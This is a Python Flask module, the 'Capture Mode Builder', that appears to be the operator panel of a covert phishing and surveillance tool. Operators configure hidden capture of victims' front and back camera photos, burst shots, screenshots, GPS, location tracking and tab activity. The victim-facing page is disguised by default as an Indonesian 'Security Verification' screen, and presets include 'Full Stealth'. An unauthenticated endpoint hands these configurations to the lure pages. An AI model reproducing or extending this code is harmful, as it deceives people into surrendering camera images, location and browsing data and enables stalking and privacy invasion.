"""Capture Mode Builder."""
from flask import Blueprint, jsonify, request, render_template
from app.auth import login_required
from app.database import db
from app.models import CaptureConfig
import secrets
import string

bp = Blueprint("modes", __name__)


def _gen_slug(length=8):
    alphabet = string.ascii_lowercase + string.digits
    while True:
        s = "".join(secrets.choice(alphabet) for _ in range(length))
        if not CaptureConfig.query.filter_by(slug=s).first():
            return s


@bp.route("/modes")
@login_required
def modes_page():
    return render_template("modes.html")


@bp.route("/api/modes/list")
@login_required
def list_modes():
    configs = CaptureConfig.query.order_by(CaptureConfig.id.desc()).all()
    return jsonify([c.to_dict() for c in configs])


@bp.route("/api/modes/create", methods=["POST"])
@login_required
def create_mode():
    data = request.get_json(force=True, silent=True) or {}
    campaign = (data.get("campaign") or "custom").strip().lower().replace(" ", "-")[:64] or "custom"
    cfg = CaptureConfig(
        slug=_gen_slug(),
        name=(data.get("name") or "Custom Mode")[:128],
        campaign=campaign,
        foto_depan=1 if data.get("foto_depan") else 0,
        foto_belakang=1 if data.get("foto_belakang") else 0,
        screenshot=1 if data.get("screenshot") else 0,
        gps=1 if data.get("gps") else 0,
        burst=1 if data.get("burst") else 0,
        burst_interval=int(data.get("burst_interval") or 3),
        burst_duration=int(data.get("burst_duration") or 30),
        location_tracking=1 if data.get("location_tracking") else 0,
        tab_log=1 if data.get("tab_log") else 0,
        delay_seconds=int(data.get("delay_seconds") or 5),
        wait_permission=1 if data.get("wait_permission", True) else 0,
        title=(data.get("title") or "Verifikasi Keamanan")[:128],
        subtitle=(data.get("subtitle") or "Mohon tunggu sebentar...")[:500],
    )
    db.session.add(cfg)
    db.session.commit()
    return jsonify({"ok": True, "slug": cfg.slug, "data": cfg.to_dict()})


@bp.route("/api/modes/delete/<int:cid>", methods=["POST", "DELETE"])
@login_required
def delete_mode(cid):
    c = CaptureConfig.query.get(cid)
    if not c:
        return jsonify({"ok": False, "msg": "not found"}), 404
    db.session.delete(c)
    db.session.commit()
    return jsonify({"ok": True})


@bp.route("/api/modes/presets")
@login_required
def presets():
    return jsonify([
        {"id": "photo-only", "name": "Photo Only", "desc": "Cuma foto depan + belakang",
         "config": {"foto_depan": True, "foto_belakang": True, "gps": False}},
        {"id": "location-only", "name": "Location Only", "desc": "Cuma GPS + IP",
         "config": {"foto_depan": False, "foto_belakang": False, "gps": True, "location_tracking": True}},
        {"id": "screenshot-only", "name": "Screenshot Only", "desc": "Cuma screenshot halaman",
         "config": {"foto_depan": False, "foto_belakang": False, "screenshot": True}},
        {"id": "full-stealth", "name": "Full Stealth", "desc": "Semua kecuali kamera",
         "config": {"foto_depan": False, "foto_belakang": False, "screenshot": True, "gps": True, "location_tracking": True, "tab_log": True}},
        {"id": "full-suite", "name": "Full Suite", "desc": "Semua fitur aktif",
         "config": {"foto_depan": True, "foto_belakang": True, "screenshot": True, "gps": True, "burst": True, "location_tracking": True, "tab_log": True}},
        {"id": "quick-snap", "name": "Quick Snap", "desc": "Foto depan saja, cepat",
         "config": {"foto_depan": True}},
    ])


@bp.route("/api/modes/get/<slug>")
def get_mode(slug):
    c = CaptureConfig.query.filter_by(slug=slug).first()
    if not c:
        return jsonify({"ok": False, "msg": "not found"}), 404
    return jsonify({"ok": True, "data": c.to_dict()})
